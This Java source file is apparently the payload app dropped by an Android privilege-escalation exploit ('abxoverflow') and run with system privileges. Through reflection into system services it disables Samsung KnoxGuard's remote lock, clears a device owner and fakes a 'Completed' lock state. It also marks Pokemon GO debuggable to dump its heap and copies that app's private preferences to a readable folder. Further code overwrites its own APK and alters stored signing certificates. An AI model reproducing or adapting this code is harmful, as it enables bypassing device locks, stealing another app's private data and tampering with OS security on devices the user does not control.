package com.example.abxoverflow.droppedapk;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;

public class MainActivity extends Activity {

    private static final String TAG = "AbxDropped";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String id = "?";
        try {
            id = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {}

        // Self-update: launched with --es action self-update
        Intent intent = getIntent();
        String strAction = intent.getStringExtra("action");
        if ("self-update".equals(strAction)) {
            selfUpdate();
            return;
        }
        if ("dump-heap".equals(strAction)) {
            dumpPogoHeap();
            return;
        }
        if ("copy-heap".equals(strAction)) {
            try {
                java.io.File src = new java.io.File("/data/data/com.nianticlabs.pokemongo/cache/pogo_heap.hprof");
                java.io.File dstDir = new java.io.File("/data/system/heapdump");
                dstDir.mkdirs();
                java.io.File dst = new java.io.File(dstDir, "pogo_heap.hprof");
                java.io.FileInputStream fis = new java.io.FileInputStream(src);
                java.io.FileOutputStream fos = new java.io.FileOutputStream(dst);
                byte[] buf = new byte[65536];
                int len;
                long total = 0;
                while ((len = fis.read(buf)) > 0) { fos.write(buf, 0, len); total += len; }
                fos.close(); fis.close();
                dst.setReadable(true, false);
                Log.e(TAG, "Heap copied: " + total + " bytes to " + dst.getAbsolutePath());
            } catch (Throwable t) {
                Log.e(TAG, "copy-heap FAILED: " + t.getMessage());
            }
            return;
        }
        if ("flip-debug".equals(strAction)) {
            String target = intent.getStringExtra("target");
            flipDebuggable(target, true);
            return;
        }
        if ("restore-debug".equals(strAction)) {
            String target = intent.getStringExtra("target");
            flipDebuggable(target, false);
            return;
        }
        if ("list-files".equals(strAction)) {
            listPogoFiles();
            return;
        }

        // Auto-run KG disable if launched with --ei action 36
        int action = intent.getIntExtra("action", 0);
        String result = "none";
        if (action > 0) {
            Log.e(TAG, "Running knoxguard_service transaction " + action + " as UID " + Process.myUid());
            result = callKnoxGuardService(action);
            Log.e(TAG, "Result: " + result);
        }

        StringBuilder s = new StringBuilder();
        s
                .append("BUILD v14c-HEAPDUMP | UID=").append(Process.myUid())
                .append(" PID=").append(Process.myPid())
                .append("\n").append(id)
                .append("\nAction: ").append(action)
                .append(" | Result: ").append(result);

        try {
            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
            for (String serviceName : ((String[]) serviceManager.getMethod("listServices").invoke(null))) {
                String serviceStr;
                try {
                    Object serviceObj = serviceManager
                            .getMethod("getService", String.class)
                            .invoke(null, serviceName);
                    if (serviceObj != null) {
                        serviceStr = serviceObj.toString();
                    } else {
                        serviceStr = "null (getService() was disallowed)";
                    }
                } catch (Throwable e) {
                    if (e instanceof InvocationTargetException) {
                        e = ((InvocationTargetException) e).getTargetException();
                    }
                    serviceStr = e.getClass().getName() + ": " + e.getMessage();
                }
                s.append("\n\n").append(serviceName).append(":\n").append(serviceStr);
            }
        } catch (Exception e) {
            s.append("\n\nFailed listing services");
        }

        ((TextView) findViewById(R.id.app_text)).setText(s.toString());
    }

    // Unwrap KgErrWrapper to see actual values
    private String unwrapKgErr(Object kgService, Object wrapper) {
        StringBuilder sb = new StringBuilder();
        try {
            // Try getIntResult on the service
            if (kgService != null) {
                try {
                    Method m = kgService.getClass().getDeclaredMethod("getIntResult",
                        wrapper.getClass());
                    m.setAccessible(true);
                    Object intResult = m.invoke(kgService, wrapper);
                    sb.append("int=").append(intResult).append(" ");
                } catch (Exception e) {
                    sb.append("getIntResult:").append(e.getMessage()).append(" ");
                }
            }
            // Dump all fields of the wrapper
            for (Field f : wrapper.getClass().getDeclaredFields()) {
                f.setAccessible(true);
                Object val = f.get(wrapper);
                sb.append(f.getName()).append("=").append(val).append(" ");
            }
        } catch (Exception e) {
            sb.append("unwrap_err:").append(e.getMessage());
        }
        return sb.toString();
    }

    // Use KnoxGuardSeService's classloader to find KnoxGuardNative (same JAR)
    private Class<?> getKGNativeClass() throws ClassNotFoundException {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
            ClassLoader cl = kgService.getClass().getClassLoader();
            return cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
        } catch (ClassNotFoundException e) {
            throw e;
        } catch (Exception e) {
            throw new ClassNotFoundException("Failed to get classloader", e);
        }
    }

    private String callKnoxGuardService(int transactionCode) {
        StringBuilder results = new StringBuilder();

        // Helper: unwrap KgErrWrapper to readable string
        // KgErrWrapper has fields we need to inspect
        Object kgService = null;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
        } catch (Exception e) {
            results.append("getService failed: ").append(e.getMessage()).append("\n");
        }

        // === STEP 1: Read current TA state ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method getTAState = nativeClass.getDeclaredMethod("tz_getTAState", int.class);
            getTAState.setAccessible(true);
            Object wrapper = getTAState.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "BEFORE: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "getTAState failed", e);
            results.append("getTAState: ").append(e.getMessage()).append("\n");
        }

        // === STEP 2: Call tz_unlockScreen(0) ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method unlock = nativeClass.getDeclaredMethod("tz_unlockScreen", int.class);
            unlock.setAccessible(true);
            Object wrapper = unlock.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "tz_unlockScreen: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "tz_unlockScreen failed", e);
            results.append("tz_unlockScreen: ").append(e.getMessage()).append("\n");
        }

        // === STEP 3: tz_userChecking(0) ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method checking = nativeClass.getDeclaredMethod("tz_userChecking", int.class);
            checking.setAccessible(true);
            Object wrapper = checking.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "tz_userChecking: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "tz_userChecking failed", e);
            results.append("tz_userChecking: ").append(e.getMessage()).append("\n");
        }

        // === STEP 4: Read TA state AFTER ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            Method getTAState = nativeClass.getDeclaredMethod("tz_getTAState", int.class);
            getTAState.setAccessible(true);
            Object wrapper = getTAState.invoke(null, 0);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            String msg = "AFTER: " + unwrapped;
            Log.e(TAG, msg);
            results.append(msg).append("\n");
        } catch (Exception e) {
            Log.e(TAG, "getTAState after failed", e);
            results.append("getTAState after: ").append(e.getMessage()).append("\n");
        }

        // === STEP 5: Also call service-level methods ===
        try {

            // unlockScreen on service (wraps native + extra logic)
            try {
                Method m = kgService.getClass().getDeclaredMethod("unlockScreen");
                m.setAccessible(true);
                m.invoke(kgService);
                Log.e(TAG, "unlockScreen(): OK");
                results.append("unlockScreen(): OK\n");
            } catch (Exception e) {
                results.append("unlockScreen: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
            }

            // unbindFromLockScreen
            try {
                Method m = kgService.getClass().getDeclaredMethod("unbindFromLockScreen");
                m.setAccessible(true);
                m.invoke(kgService);
                Log.e(TAG, "unbindFromLockScreen(): OK");
                results.append("unbindFromLockScreen(): OK\n");
            } catch (Exception e) {
                results.append("unbindFromLockScreen: ").append(e.getMessage()).append("\n");
            }

            // setRemoteLockToLockscreen(false)
            try {
                Method m = kgService.getClass().getDeclaredMethod("setRemoteLockToLockscreen", boolean.class);
                m.setAccessible(true);
                m.invoke(kgService, false);
                Log.e(TAG, "setRemoteLockToLockscreen(false): OK");
                results.append("setRemoteLock(false): OK\n");
            } catch (Exception e) {
                results.append("setRemoteLock: ").append(e.getMessage()).append("\n");
            }
        } catch (Exception e) {
            results.append("service methods: ").append(e.getMessage()).append("\n");
        }

        // === STEP 6: Unregister boot receiver to prevent re-lock ===
        try {
            // Get the mSystemReceiver field and unregister it
            Field receiverField = kgService.getClass().getDeclaredField("mSystemReceiver");
            receiverField.setAccessible(true);
            Object receiver = receiverField.get(kgService);
            if (receiver != null) {
                // Get context to unregister
                Field ctxField = kgService.getClass().getDeclaredField("mContext");
                ctxField.setAccessible(true);
                android.content.Context ctx = (android.content.Context) ctxField.get(kgService);
                ctx.unregisterReceiver((android.content.BroadcastReceiver) receiver);
                // Null out the field
                receiverField.set(kgService, null);
                Log.e(TAG, "mSystemReceiver UNREGISTERED");
                results.append("mSystemReceiver: UNREGISTERED\n");
            }
            // Also null out mServiceSystemReceiver
            Field srvReceiverField = kgService.getClass().getDeclaredField("mServiceSystemReceiver");
            srvReceiverField.setAccessible(true);
            Object srvReceiver = srvReceiverField.get(kgService);
            if (srvReceiver != null) {
                Field ctxField = kgService.getClass().getDeclaredField("mContext");
                ctxField.setAccessible(true);
                android.content.Context ctx = (android.content.Context) ctxField.get(kgService);
                ctx.unregisterReceiver((android.content.BroadcastReceiver) srvReceiver);
                srvReceiverField.set(kgService, null);
                Log.e(TAG, "mServiceSystemReceiver UNREGISTERED");
                results.append("mServiceSystemReceiver: UNREGISTERED\n");
            }
        } catch (Exception e) {
            Log.e(TAG, "Unregister receiver failed", e);
            results.append("unregister: ").append(e.getMessage()).append("\n");
        }

        // === STEP 7: Try native tz_resetRPMB ===
        try {
            Class<?> nativeClass = getKGNativeClass();
            // Try resetRPMB with just int param
            Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class, byte[].class);
            reset.setAccessible(true);
            Object wrapper = reset.invoke(null, 0, new byte[0]);
            String unwrapped = unwrapKgErr(kgService, wrapper);
            Log.e(TAG, "tz_resetRPMB: " + unwrapped);
            results.append("tz_resetRPMB: ").append(unwrapped).append("\n");
        } catch (NoSuchMethodException e) {
            // Try without byte[] param
            try {
                Class<?> nativeClass = getKGNativeClass();
                Method reset = nativeClass.getDeclaredMethod("tz_resetRPMB", int.class);
                reset.setAccessible(true);
                Object wrapper = reset.invoke(null, 0);
                String unwrapped = unwrapKgErr(kgService, wrapper);
                Log.e(TAG, "tz_resetRPMB(int): " + unwrapped);
                results.append("tz_resetRPMB: ").append(unwrapped).append("\n");
            } catch (Exception e2) {
                Log.e(TAG, "tz_resetRPMB(int) failed", e2);
                results.append("tz_resetRPMB: ").append(e2.getMessage()).append("\n");
            }
        } catch (Exception e) {
            Log.e(TAG, "tz_resetRPMB failed", e);
            results.append("tz_resetRPMB: ").append(e.getMessage()).append("\n");
        }

        // === STEP 8: Clear Device Owner (stops it from re-disabling kgclient) ===
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object dpmBinder = sm.getMethod("getService", String.class).invoke(null, "device_policy");
            // Get the actual DPM service impl
            Field dpmField = dpmBinder.getClass().getDeclaredField("this$0");
            dpmField.setAccessible(true);
            Object dpmService = dpmField.get(dpmBinder);
            // Call clearDeviceOwner
            Method clearDO = dpmService.getClass().getDeclaredMethod("clearDeviceOwner", String.class);
            clearDO.setAccessible(true);
            clearDO.invoke(dpmService, "com.kyin.adbenab");
            Log.e(TAG, "clearDeviceOwner: OK");
            results.append("clearDeviceOwner: OK\n");
        } catch (Exception e) {
            Log.e(TAG, "clearDeviceOwner failed", e);
            results.append("clearDeviceOwner: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
        }

        // === STEP 9: Re-enable kgclient ===
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object pmBinder = sm.getMethod("getService", String.class).invoke(null, "package");
            // setApplicationEnabledSetting(String packageName, int newState, int flags, int userId, String callingPackage)
            Method setEnabled = pmBinder.getClass().getDeclaredMethod("setApplicationEnabledSetting",
                String.class, int.class, int.class, int.class, String.class);
            setEnabled.setAccessible(true);
            // COMPONENT_ENABLED_STATE_ENABLED = 1
            setEnabled.invoke(pmBinder, "com.samsung.android.kgclient", 1, 0, 0, "android");
            Log.e(TAG, "kgclient re-enabled: OK");
            results.append("kgclient enabled: OK\n");
        } catch (Exception e) {
            Log.e(TAG, "kgclient enable failed", e);
            results.append("kgclient enable: ").append(e.getCause() != null ? e.getCause().getMessage() : e.getMessage()).append("\n");
        }

        // === STEP 10: Set system property to Completed ===
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method set = sysProp.getMethod("set", String.class, String.class);
            set.invoke(null, "knox.kg.state", "Completed");
            Log.e(TAG, "SystemProperties.set knox.kg.state=Completed: OK");
            results.append("sysprop Completed: OK\n");
        } catch (Exception e) {
            results.append("sysprop: ").append(e.getMessage()).append("\n");
        }

        Log.e(TAG, "FINAL: " + results.toString());
        return results.toString();
    }

    private void selfUpdate() {
        Log.e(TAG, "SELF-UPDATE starting...");
        java.io.File source = new java.io.File("/data/local/tmp/droppedapk-update.apk");
        java.io.File target = new java.io.File("/data/app/dropped_apk/base.apk");
        java.io.File oatDir = new java.io.File("/data/app/dropped_apk/oat");

        if (!source.exists()) {
            Log.e(TAG, "No update APK at " + source);
            return;
        }

        // 1. Delete stale compiled code
        deleteRecursive(oatDir);
        Log.e(TAG, "Cleared oat cache");

        // 2. Write to tmp then atomic rename
        java.io.File tmpTarget = new java.io.File("/data/app/dropped_apk/base.apk.tmp");
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(source);
            java.io.FileOutputStream fos = new java.io.FileOutputStream(tmpTarget);
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) > 0) fos.write(buf, 0, len);
            fos.close();
            fis.close();

            // Set permissions before rename
            tmpTarget.setReadable(true, false);
            tmpTarget.setWritable(true, true);

            // Atomic rename
            if (tmpTarget.renameTo(target)) {
                Log.e(TAG, "APK replaced via atomic rename");
                // Clean up source
                source.delete();
                // Reboot via PowerManager
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
                pm.reboot("self-update");
            } else {
                Log.e(TAG, "Atomic rename FAILED — aborting self-update (will NOT write to live base.apk)");
                if (tmpTarget.exists()) tmpTarget.delete();
            }

        } catch (Exception e) {
            Log.e(TAG, "Self-update FAILED: " + e.getMessage());
            // Clean up tmp if it exists
            if (tmpTarget.exists()) tmpTarget.delete();
        }
    }

    private void deleteRecursive(java.io.File f) {
        if (f == null || !f.exists()) return;
        if (f.isDirectory()) {
            java.io.File[] children = f.listFiles();
            if (children != null) for (java.io.File c : children) deleteRecursive(c);
        }
        f.delete();
    }

    private void dumpPogoHeap() {
        // Direct heap dump via IApplicationThread is dead — SELinux blocks FD creation.
        // Use flip-debug + am dumpheap from ADB shell instead.
        Log.e(TAG, "dump-heap DEPRECATED: Use flip-debug + am dumpheap from ADB shell instead");
        Log.e(TAG, "  Step 1: am start --es action flip-debug --es target com.nianticlabs.pokemongo");
        Log.e(TAG, "  Step 2: am dumpheap com.nianticlabs.pokemongo /data/local/tmp/pogo.hprof");
        Log.e(TAG, "  Step 3: am start --es action restore-debug --es target com.nianticlabs.pokemongo");
    }

    /**
     * Flip the debuggable flag on a running app's ProcessRecord.
     * This makes `am dumpheap` work from ADB shell without needing a debuggable build.
     * AMS unwrap + PidMap iteration to find the target process.
     */
    private void flipDebuggable(String packageName, boolean enable) {
        try {
            if (packageName == null || packageName.isEmpty()) {
                Log.e(TAG, "flip-debug: no target package specified");
                return;
            }
            Log.e(TAG, (enable ? "FLIP-DEBUG" : "RESTORE-DEBUG") + " for " + packageName);

            // Get AMS binder stub and unwrap
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Object amsBinder = sm.getMethod("getService", String.class).invoke(null, "activity");
            Object ams = amsBinder;
            try {
                java.lang.reflect.Field thisField = amsBinder.getClass().getDeclaredField("this$0");
                thisField.setAccessible(true);
                ams = thisField.get(amsBinder);
                Log.e(TAG, "  AMS impl: " + ams.getClass().getName());
            } catch (NoSuchFieldException e) {
                Log.e(TAG, "  No this$0, using direct: " + amsBinder.getClass().getName());
            }

            // Get pid map
            Object pidMap = null;
            try {
                java.lang.reflect.Field f = ams.getClass().getDeclaredField("mPidsSelfLocked");
                f.setAccessible(true);
                pidMap = f.get(ams);
            } catch (NoSuchFieldException e) {
                java.lang.reflect.Field plField = ams.getClass().getDeclaredField("mProcessList");
                plField.setAccessible(true);
                Object processList = plField.get(ams);
                java.lang.reflect.Field f2 = processList.getClass().getDeclaredField("mPidsSelfLocked");
                f2.setAccessible(true);
                pidMap = f2.get(processList);
            }
            Log.e(TAG, "  PidMap class: " + pidMap.getClass().getName());

            // Iterate all ProcessRecords to find target by processName
            // PidMap has mPidMap (SparseArray) internally
            Object sparseArray = null;
            for (java.lang.reflect.Field f : pidMap.getClass().getDeclaredFields()) {
                f.setAccessible(true);
                Object val = f.get(pidMap);
                if (val != null && val.getClass().getSimpleName().contains("SparseArray")) {
                    sparseArray = val;
                    break;
                }
            }

            if (sparseArray == null) {
                // Fallback: pidMap itself might be the sparse array or have a different structure
                // Try using size() and valueAt() directly on pidMap
                sparseArray = pidMap;
            }

            java.lang.reflect.Method sizeMethod = sparseArray.getClass().getMethod("size");
            java.lang.reflect.Method valueAtMethod = sparseArray.getClass().getMethod("valueAt", int.class);
            int size = (int) sizeMethod.invoke(sparseArray);
            Log.e(TAG, "  PidMap has " + size + " processes");

            boolean found = false;
            for (int i = 0; i < size; i++) {
                Object procRecord = valueAtMethod.invoke(sparseArray, i);
                if (procRecord == null) continue;

                // Get processName field
                String procName = null;
                try {
                    java.lang.reflect.Field nameField = procRecord.getClass().getDeclaredField("processName");
                    nameField.setAccessible(true);
                    procName = (String) nameField.get(procRecord);
                } catch (NoSuchFieldException e) {
                    // Try parent class
                    try {
                        java.lang.reflect.Field nameField = procRecord.getClass().getSuperclass().getDeclaredField("processName");
                        nameField.setAccessible(true);
                        procName = (String) nameField.get(procRecord);
                    } catch (Exception e2) { continue; }
                }

                if (!packageName.equals(procName)) continue;
                found = true;

                // Found it — get ApplicationInfo and flip debuggable flag
                // ProcessRecord.info is ApplicationInfo
                Object appInfo = null;
                try {
                    java.lang.reflect.Field infoField = procRecord.getClass().getDeclaredField("info");
                    infoField.setAccessible(true);
                    appInfo = infoField.get(procRecord);
                } catch (NoSuchFieldException e) {
                    // Try via getApplicationInfo() method
                    try {
                        java.lang.reflect.Method getInfo = procRecord.getClass().getMethod("getApplicationInfo");
                        appInfo = getInfo.invoke(procRecord);
                    } catch (Exception e2) {
                        Log.e(TAG, "  Cannot get ApplicationInfo: " + e2.getMessage());
                        continue;
                    }
                }

                if (appInfo == null) {
                    Log.e(TAG, "  ApplicationInfo is null for " + procName);
                    continue;
                }

                // ApplicationInfo.flags — FLAG_DEBUGGABLE = 0x2
                java.lang.reflect.Field flagsField = appInfo.getClass().getDeclaredField("flags");
                flagsField.setAccessible(true);
                int flags = flagsField.getInt(appInfo);
                int oldFlags = flags;

                if (enable) {
                    flags |= 0x2; // FLAG_DEBUGGABLE
                } else {
                    flags &= ~0x2;
                }
                flagsField.setInt(appInfo, flags);

                Log.e(TAG, "  " + procName + " flags: 0x" + Integer.toHexString(oldFlags)
                    + " -> 0x" + Integer.toHexString(flags)
                    + (enable ? " (DEBUGGABLE ON)" : " (DEBUGGABLE OFF)"));
                break;
            }

            if (!found) {
                Log.e(TAG, "  Process not found: " + packageName);
            }

        } catch (Throwable t) {
            Log.e(TAG, "flipDebuggable FAILED: " + t.getMessage());
            t.printStackTrace();
        }
    }

    private void listPogoFiles() {
        try {
            String[] dirs = {
                "/data/data/com.nianticlabs.pokemongo",
                "/data/data/com.nianticlabs.pokemongo/shared_prefs",
                "/data/data/com.nianticlabs.pokemongo/databases",
                "/data/data/com.nianticlabs.pokemongo/files",
                "/data/data/com.nianticlabs.pokemongo/cache",
            };
            StringBuilder sb = new StringBuilder();
            for (String dir : dirs) {
                java.io.File d = new java.io.File(dir);
                sb.append("\n=== ").append(dir).append(" ===\n");
                if (d.exists() && d.isDirectory()) {
                    java.io.File[] files = d.listFiles();
                    if (files != null) {
                        for (java.io.File f : files) {
                            sb.append(String.format("  %s %d %s\n",
                                f.isDirectory() ? "DIR" : "FILE",
                                f.length(), f.getName()));
                        }
                    }
                } else {
                    sb.append("  NOT ACCESSIBLE\n");
                }
            }
            Log.e(TAG, "POGO FILES:" + sb.toString());

            // Copy small prefs files to /data/system/heapdump/ for extraction
            new java.io.File("/data/system/heapdump").mkdirs();
            java.io.File prefsDir = new java.io.File("/data/data/com.nianticlabs.pokemongo/shared_prefs");
            if (prefsDir.exists()) {
                java.io.File[] prefs = prefsDir.listFiles();
                if (prefs != null) {
                    for (java.io.File pref : prefs) {
                        if (pref.isFile() && pref.length() < 1048576) { // < 1MB
                            copyFile(pref, new java.io.File("/data/system/heapdump/pogo_" + pref.getName()));
                            Log.e(TAG, "Copied: " + pref.getName());
                        }
                    }
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "listPogoFiles FAILED: " + t.getMessage());
        }
    }

    private void copyFile(java.io.File src, java.io.File dst) throws java.io.IOException {
        java.io.FileInputStream fis = new java.io.FileInputStream(src);
        java.io.FileOutputStream fos = new java.io.FileOutputStream(dst);
        byte[] buf = new byte[8192];
        int len;
        while ((len = fis.read(buf)) > 0) fos.write(buf, 0, len);
        fos.close();
        fis.close();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @SuppressLint("MissingPermission")
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.uninstall) {
            try {
                // Delete <pastSigs> by directly editing PackageManagerService state within system_server
                // ServiceManager.getService("package").this$0.mSettings.mSharedUsers.get("android.uid.system").getSigningDetails().mPastSigningCertificates = null
                Object packManImplService = Class.forName("android.os.ServiceManager").getMethod("getService", String.class).invoke(null, "package");
                Field packManImplThisField = packManImplService.getClass().getDeclaredField("this$0");
                packManImplThisField.setAccessible(true);
                Object packManService = packManImplThisField.get(packManImplService);
                Field settingsField = packManService.getClass().getDeclaredField("mSettings");
                settingsField.setAccessible(true);
                Object settings = settingsField.get(packManService);
                Field sharedUsersField = settings.getClass().getDeclaredField("mSharedUsers");
                sharedUsersField.setAccessible(true);
                Object sharedUser = ((Map) sharedUsersField.get(settings)).get("android.uid.system");
                Object signingDetails = sharedUser.getClass().getMethod("getSigningDetails").invoke(sharedUser);
                Field pastSigningCertificatesField = signingDetails.getClass().getDeclaredField("mPastSigningCertificates");
                pastSigningCertificatesField.setAccessible(true);
                pastSigningCertificatesField.set(signingDetails, null);

                // Uninstall this app (also triggers write of fixed packages.xml)
                getPackageManager().getPackageInstaller().uninstall(getPackageName(), null);
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "Uninstall failed", Toast.LENGTH_SHORT).show();
            }
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}